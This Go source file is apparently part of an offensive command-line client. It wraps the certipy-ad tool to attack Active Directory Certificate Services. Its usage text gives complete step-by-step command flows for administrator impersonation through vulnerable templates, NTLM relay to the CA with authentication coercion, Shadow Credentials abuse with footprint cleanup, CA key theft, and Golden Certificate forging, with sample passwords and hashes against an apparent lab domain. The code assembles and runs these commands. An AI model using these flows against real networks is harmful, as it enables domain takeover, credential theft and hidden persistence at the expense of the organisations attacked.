package client

import (
	"fmt"
	"strings"
)

var certipySubcmds = []string{
	"find", "req", "auth", "ca", "shadow", "relay", "forge", "template", "account", "cert", "parse",
}

const certipyUsage = `usage: certipy <subcommand> [options]

  Enumerates and abuses Active Directory Certificate Services (ADCS).
  The tool is certipy-ad v5; install with: pip3 install certipy-ad

  Authentication note:
    -u user@domain    (certipy format: user@domain)
    -p password
    -H :NThash        (pass-the-hash; converted to -hashes :NT)
    -k                (Kerberos, uses KRB5CCNAME)
    -dc-ip <ip>       (always recommended)

subcommands:
  find       Enumerate ADCS: CAs, templates, vulnerabilities (ESC1-ESC16)
  req        Request a certificate from a template
  auth       Authenticate with a PFX certificate → TGT + NT hash
  ca         Manage the CA (templates, requests, backup)
  shadow     Shadow Credentials: add/remove msDS-KeyCredentialLink
  relay      Relay NTLM to ADCS HTTP (ESC8) or RPC (ESC11)
  forge      Forge certificates with the CA key or self-signed
  template   Modify certificate templates directly
  account    Create/modify user and machine accounts
  cert       Manage PFX/PEM/DER files

examples — ESC1 flow (arbitrary SAN):
  # 1. Enumerate vulnerable templates
  certipy find 10.2.20.100 -u mssql_svc@cs.org -p shelby -dc-ip 10.2.20.100 -vulnerable -stdout

  # 2. Request cert with administrator UPN
  certipy req 10.2.20.100 -u mssql_svc@cs.org -p shelby -dc-ip 10.2.20.100 \
    -ca cs-WIN2022-SRV-X64-CA -template VulnTemplate -upn administrator@cs.org

  # 3. Authenticate with the certificate → TGT + NT hash
  certipy auth -pfx administrator.pfx -dc-ip 10.2.20.100

examples — ESC8 flow (HTTP relay):
  # Intercept NTLM authentications from the CA and request cert
  certipy relay 10.2.20.100 -target http://10.2.20.100

examples — Shadow Credentials (PKINIT abuse):
  # Add Key Credential Link to the victim and automatically obtain cert
  certipy shadow 10.2.20.100 -u Administrator@cs.org -p 'P@ss1!' -account victim -dc-ip 10.2.20.100 auto

examples — Golden Certificate (compromised CA key):
  # CA backup (requires Manage CA)
  certipy ca 10.2.20.100 -u Administrator@cs.org -p 'P@ss1!' -ca cs-WIN2022-SRV-X64-CA -backup
  # Forge cert for any user
  certipy forge -ca-pfx cs-WIN2022-SRV-X64-CA.pfx -upn administrator@cs.org

  For detailed help on a subcommand: certipy <sub> -h`

// buildCertipyAuth translates our flag convention to certipy's format.
// certipy uses -u user@domain, -p pass, -hashes :NT (not -H).
func buildCertipyAuth(flags map[string]string) []string {
	var a []string
	if u := flags["u"]; u != "" {
		a = append(a, "-u", u)
	}
	if p := flags["p"]; p != "" {
		a = append(a, "-p", p)
	}
	if h := flags["H"]; h != "" {
		if !strings.Contains(h, ":") {
			h = ":" + h
		}
		a = append(a, "-hashes", h)
	}
	if flags["k"] != "" {
		a = append(a, "-k", "-no-pass")
	}
	return a
}

func (cl *CLI) cmdCertipy(args []string) {
	tool := cl.mustTool("certipy-ad", "certipy")
	if tool == "" {
		fmt.Println("[!] install with: pip3 install certipy-ad")
		return
	}

	if len(args) == 0 {
		fmt.Println(certipyUsage)
		return
	}

	sub := args[0]
	rest := args[1:]

	// Handle -h before dispatching so we get certipy's own help
	for _, a := range rest {
		if a == "-h" || a == "--help" {
			cl.runTool(append([]string{tool, sub}, rest...))
			return
		}
	}

	switch sub {
	case "find":
		cl.certipyFind(tool, rest)
	case "req":
		cl.certipyReq(tool, rest)
	case "auth":
		cl.certipyAuth(tool, rest)
	case "ca":
		cl.certipyCa(tool, rest)
	case "shadow":
		cl.certipyShadow(tool, rest)
	case "relay":
		cl.certipyRelay(tool, rest)
	case "forge":
		cl.certipyForge(tool, rest)
	case "template", "account", "cert", "parse":
		// passthrough sin transformación
		cl.runTool(append([]string{tool, sub}, rest...))
	default:
		fmt.Printf("[!] unknown subcommand: %s\n\n", sub)
		fmt.Println(certipyUsage)
	}
}

// ── find ──────────────────────────────────────────────────────────────────

const certipyFindUsage = `usage: certipy find <dc-ip> -u user@domain [-p pass] [-H hash] [-k]
                         [-vulnerable] [-enabled] [-stdout] [-dc-only]

  Enumerates CAs, templates and misconfigurations (ESC1–ESC16).
  -vulnerable   show only vulnerable templates
  -enabled      show only enabled templates
  -stdout       print result to screen (in addition to saving file)
  -dc-only      query DC only (without checking Web Enrollment)

examples:
  certipy find 10.2.20.100 -u mssql_svc@cs.org -p shelby -dc-ip 10.2.20.100 -vulnerable -stdout
  certipy find 10.2.20.100 -u mssql_svc@cs.org -H :8846f7eaee8fb117ad06bdd830b7586c -vulnerable -stdout`

func (cl *CLI) certipyFind(tool string, args []string) {
	pos, flags := parseLocalFlags(args)
	if len(pos) == 0 || flags["u"] == "" {
		fmt.Println(certipyFindUsage)
		return
	}
	dcIP := pos[0]
	if flags["dc-ip"] != "" {
		dcIP = flags["dc-ip"]
	}
	a := []string{tool, "find", "-dc-ip", dcIP}
	a = append(a, buildCertipyAuth(flags)...)
	if flags["vulnerable"] != "" {
		a = append(a, "-vulnerable")
	}
	if flags["enabled"] != "" {
		a = append(a, "-enabled")
	}
	if flags["stdout"] != "" {
		a = append(a, "-stdout")
	} else {
		// Default: print to stdout for convenience
		a = append(a, "-stdout")
	}
	if flags["dc-only"] != "" {
		a = append(a, "-dc-only")
	}
	fmt.Printf("[*] certipy find → %s\n", dcIP)
	cl.runTool(a)
}

// ── req ───────────────────────────────────────────────────────────────────

const certipyReqUsage = `usage: certipy req <target> -u user@domain [-p pass] [-H hash] [-k]
                        -ca <CA-name> [-template <tmpl>] [-upn <upn>]
                        [-dns <dns>] [-sid <sid>] [-on-behalf-of domain\user]
                        [-pfx <agent.pfx>] [-dc-ip <ip>] [-out <file>]

  Requests a certificate from a CA template.
  The CA can be obtained with: certipy find ... -vulnerable -stdout
  -upn      UPN to include in the SAN (ESC1, ESC2: admin impersonation)
  -on-behalf-of  request on behalf of another account (ESC3: enrollment agent)
  -pfx      enrollment agent certificate for -on-behalf-of

examples:
  # ESC1: template allows arbitrary SAN
  certipy req 10.2.20.100 -u mssql_svc@cs.org -p shelby -dc-ip 10.2.20.100 \
    -ca cs-WIN2022-SRV-X64-CA -template VulnTemplate -upn administrator@cs.org

  # ESC3: enrollment agent → request on behalf of administrator
  certipy req 10.2.20.100 -u agent@cs.org -p shelby -dc-ip 10.2.20.100 \
    -ca cs-WIN2022-SRV-X64-CA -template EnrollmentAgent -pfx agent.pfx \
    -on-behalf-of cs.org\Administrator`

func (cl *CLI) certipyReq(tool string, args []string) {
	pos, flags := parseLocalFlags(args)
	if len(pos) == 0 || flags["u"] == "" || flags["ca"] == "" {
		fmt.Println(certipyReqUsage)
		return
	}
	target := pos[0]
	dcIP := flags["dc-ip"]
	if dcIP == "" {
		dcIP = target
	}
	a := []string{tool, "req", "-dc-ip", dcIP, "-target", target}
	a = append(a, buildCertipyAuth(flags)...)
	a = append(a, "-ca", flags["ca"])
	if t := flags["template"]; t != "" {
		a = append(a, "-template", t)
	}
	if v := flags["upn"]; v != "" {
		a = append(a, "-upn", v)
	}
	if v := flags["dns"]; v != "" {
		a = append(a, "-dns", v)
	}
	if v := flags["sid"]; v != "" {
		a = append(a, "-sid", v)
	}
	if v := flags["on-behalf-of"]; v != "" {
		a = append(a, "-on-behalf-of", v)
	}
	if v := flags["pfx"]; v != "" {
		a = append(a, "-pfx", v)
	}
	if v := flags["out"]; v != "" {
		a = append(a, "-out", v)
	}
	fmt.Printf("[*] certipy req → %s  ca=%s\n", target, flags["ca"])
	cl.runTool(a)
}

// ── auth ──────────────────────────────────────────────────────────────────

const certipyAuthUsage = `usage: certipy auth -pfx <file.pfx> [-dc-ip <ip>] [-ldap-shell]

  Authenticate with a PFX certificate via PKINIT.
  Obtains: TGT (.ccache) + NT hash of the account.
  -ldap-shell   opens LDAP shell (useful when PKINIT is not available)

  After running:
    export KRB5CCNAME=<user>.ccache

examples:
  certipy auth -pfx administrator.pfx -dc-ip 10.2.20.100
  certipy auth -pfx administrator.pfx -dc-ip 10.2.20.100 -ldap-shell`

func (cl *CLI) certipyAuth(tool string, args []string) {
	_, flags := parseLocalFlags(args)
	if flags["pfx"] == "" {
		fmt.Println(certipyAuthUsage)
		return
	}
	a := []string{tool, "auth", "-pfx", flags["pfx"]}
	if v := flags["dc-ip"]; v != "" {
		a = append(a, "-dc-ip", v)
	}
	if flags["ldap-shell"] != "" {
		a = append(a, "-ldap-shell")
	}
	if v := flags["username"]; v != "" {
		a = append(a, "-username", v)
	}
	if v := flags["domain"]; v != "" {
		a = append(a, "-domain", v)
	}
	fmt.Printf("[*] certipy auth → %s\n", flags["pfx"])
	cl.runTool(a)
}

// ── ca ────────────────────────────────────────────────────────────────────

const certipyCaUsage = `usage: certipy ca <target> -u user@domain [-p pass] [-H hash]
                       -ca <CA-name> [action] [-dc-ip <ip>]

  Manages the Certification Authority.

  actions:
    -list-templates              list enabled templates
    -enable-template <name>      enable template
    -disable-template <name>     disable template
    -issue-request <id>          approve pending request
    -deny-request <id>           deny request
    -add-officer <user>          add Certificate Manager
    -backup                      back up the CA cert+key

examples:
  certipy ca 10.2.20.100 -u Administrator@cs.org -p 'P@ss1!' -ca cs-WIN2022-SRV-X64-CA -list-templates
  certipy ca 10.2.20.100 -u Administrator@cs.org -p 'P@ss1!' -ca cs-WIN2022-SRV-X64-CA -enable-template SubCA
  certipy ca 10.2.20.100 -u Administrator@cs.org -p 'P@ss1!' -ca cs-WIN2022-SRV-X64-CA -backup`

func (cl *CLI) certipyCa(tool string, args []string) {
	pos, flags := parseLocalFlags(args)
	if len(pos) == 0 || flags["u"] == "" || flags["ca"] == "" {
		fmt.Println(certipyCaUsage)
		return
	}
	target := pos[0]
	dcIP := flags["dc-ip"]
	if dcIP == "" {
		dcIP = target
	}
	a := []string{tool, "ca", "-dc-ip", dcIP, "-target", target}
	a = append(a, buildCertipyAuth(flags)...)
	a = append(a, "-ca", flags["ca"])
	// Pass remaining action flags through
	for _, f := range []string{
		"list-templates", "enable-template", "disable-template",
		"issue-request", "deny-request", "add-officer", "remove-officer",
		"add-manager", "remove-manager", "backup",
	} {
		if v := flags[f]; v != "" {
			if v == "true" {
				a = append(a, "-"+f)
			} else {
				a = append(a, "-"+f, v)
			}
		}
	}
	cl.runTool(a)
}

// ── shadow ────────────────────────────────────────────────────────────────

const certipyShadowUsage = `usage: certipy shadow <target> -u user@domain [-p pass] [-H hash]
                           [-account <victim>] [-dc-ip <ip>]
                           <action: list|add|remove|clear|info|auto>

  Manipulates Key Credential Links (msDS-KeyCredentialLink) in AD.
  'auto' adds the attribute, obtains the cert, and removes it in one step.

  Requirement: the attacker must have write permissions on the victim object.

examples:
  # Auto-exploit: obtain victim cert and clean up the footprint
  certipy shadow 10.2.20.100 -u mssql_svc@cs.org -p shelby -account victim -dc-ip 10.2.20.100 auto

  # View current Key Credentials of the victim
  certipy shadow 10.2.20.100 -u mssql_svc@cs.org -p shelby -account victim -dc-ip 10.2.20.100 list

  # Then authenticate with the obtained certificate
  certipy auth -pfx victim.pfx -dc-ip 10.2.20.100`

func (cl *CLI) certipyShadow(tool string, args []string) {
	pos, flags := parseLocalFlags(args)
	// pos[0] = target, last pos = action
	if len(pos) < 2 || flags["u"] == "" {
		fmt.Println(certipyShadowUsage)
		return
	}
	target := pos[0]
	action := pos[len(pos)-1]
	dcIP := flags["dc-ip"]
	if dcIP == "" {
		dcIP = target
	}
	a := []string{tool, "shadow", "-dc-ip", dcIP, "-target", target}
	a = append(a, buildCertipyAuth(flags)...)
	if v := flags["account"]; v != "" {
		a = append(a, "-account", v)
	}
	if v := flags["device-id"]; v != "" {
		a = append(a, "-device-id", v)
	}
	if v := flags["out"]; v != "" {
		a = append(a, "-out", v)
	}
	a = append(a, action)
	fmt.Printf("[*] certipy shadow %s → %s\n", action, target)
	cl.runTool(a)
}

// ── relay ─────────────────────────────────────────────────────────────────

const certipyRelayUsage = `usage: certipy relay -target <protocol://ca-host> [-ca <CA-name>]
                          [-template <tmpl>] [-upn <upn>] [-forever]

  Relay NTLM to ADCS to obtain certificates for the relayed accounts.
  -target   CA URL: http://<ca> (ESC8) or rpc://<ca> (ESC11)
  -ca       CA name (required for ESC11/RPC)
  -upn      UPN to include in the SAN
  -forever  keep waiting for connections (do not exit after the first one)

  ESC8 flow (HTTP Web Enrollment):
    1. Start: certipy relay -target http://10.2.20.100
    2. In another terminal: responder -I eth0 -A   (analysis mode, no SMB/HTTP)
       or trigger authentication: coerce/PetitPotam/PrinterBug → ca-host

  ESC11 flow (RPC relay, without Web Enrollment):
    certipy relay -target rpc://10.2.20.100 -ca cs-WIN2022-SRV-X64-CA -template DomainController

examples:
  certipy relay -target http://10.2.20.100
  certipy relay -target http://10.2.20.100 -template DomainController -forever
  certipy relay -target rpc://10.2.20.100 -ca cs-WIN2022-SRV-X64-CA`

func (cl *CLI) certipyRelay(tool string, args []string) {
	_, flags := parseLocalFlags(args)
	if flags["target"] == "" {
		fmt.Println(certipyRelayUsage)
		return
	}
	a := []string{tool, "relay", "-target", flags["target"]}
	if v := flags["ca"]; v != "" {
		a = append(a, "-ca", v)
	}
	if v := flags["template"]; v != "" {
		a = append(a, "-template", v)
	}
	if v := flags["upn"]; v != "" {
		a = append(a, "-upn", v)
	}
	if v := flags["dns"]; v != "" {
		a = append(a, "-dns", v)
	}
	if v := flags["interface"]; v != "" {
		a = append(a, "-interface", v)
	}
	if v := flags["port"]; v != "" {
		a = append(a, "-port", v)
	}
	if flags["forever"] != "" {
		a = append(a, "-forever")
	}
	fmt.Printf("[*] certipy relay → %s\n", flags["target"])
	cl.runTool(a)
}

// ── forge ─────────────────────────────────────────────────────────────────

const certipyForgeUsage = `usage: certipy forge -ca-pfx <ca.pfx> -upn <upn@domain> [-validity <days>] [-out <file>]
     certipy forge -upn <upn@domain>   (self-signed, without real CA)

  Forges a valid certificate with the compromised CA key.
  Useful when a CA backup has been made (Golden Certificate).
  Without -ca-pfx generates a self-signed certificate (limited validity).

examples:
  # Golden Cert with compromised CA
  certipy forge -ca-pfx cs-WIN2022-SRV-X64-CA.pfx -upn administrator@cs.org

  # Self-signed (without real CA)
  certipy forge -upn administrator@cs.org

  # Authenticate with the forged certificate
  certipy auth -pfx administrator_forged.pfx -dc-ip 10.2.20.100`

func (cl *CLI) certipyForge(tool string, args []string) {
	_, flags := parseLocalFlags(args)
	if flags["upn"] == "" && flags["dns"] == "" {
		fmt.Println(certipyForgeUsage)
		return
	}
	a := []string{tool, "forge"}
	if v := flags["ca-pfx"]; v != "" {
		a = append(a, "-ca-pfx", v)
	}
	if v := flags["ca-password"]; v != "" {
		a = append(a, "-ca-password", v)
	}
	if v := flags["upn"]; v != "" {
		a = append(a, "-upn", v)
	}
	if v := flags["dns"]; v != "" {
		a = append(a, "-dns", v)
	}
	if v := flags["sid"]; v != "" {
		a = append(a, "-sid", v)
	}
	if v := flags["subject"]; v != "" {
		a = append(a, "-subject", v)
	}
	if v := flags["validity"]; v != "" {
		a = append(a, "-validity-period", v)
	}
	if v := flags["out"]; v != "" {
		a = append(a, "-out", v)
	}
	cl.runTool(a)
}
